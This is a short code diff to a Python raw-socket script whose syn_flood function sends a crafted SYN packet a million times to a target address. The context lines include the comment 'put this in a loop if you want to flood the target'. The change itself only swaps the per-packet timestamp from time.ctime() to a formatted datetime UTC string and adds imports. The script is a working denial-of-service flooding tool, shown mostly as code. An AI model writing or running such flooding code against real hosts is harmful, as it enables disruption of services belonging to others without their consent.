@@ -4,7 +4,7 @@
 
 # some imports
 import socket, sys
-from datetime import time
+from datetime import time, datetime
 from random import randrange
 from struct import *
 
@@ -13,6 +13,9 @@ from struct import *
 
 
 # checksum functions needed for calculation checksum
+from time import ctime
+
+
 def checksum(msg):
     s = 0
     # loop taking 2 characters at a time
@@ -111,7 +114,8 @@ def syn_flood(src, dst):
     rang = 1000000
     s, packet = creat(src, dst)
     for i in range(rang):
-        print(f"{time.ctime()},{i}")
+        time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
+        print(f"{time},{i}")
         s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target
 
 
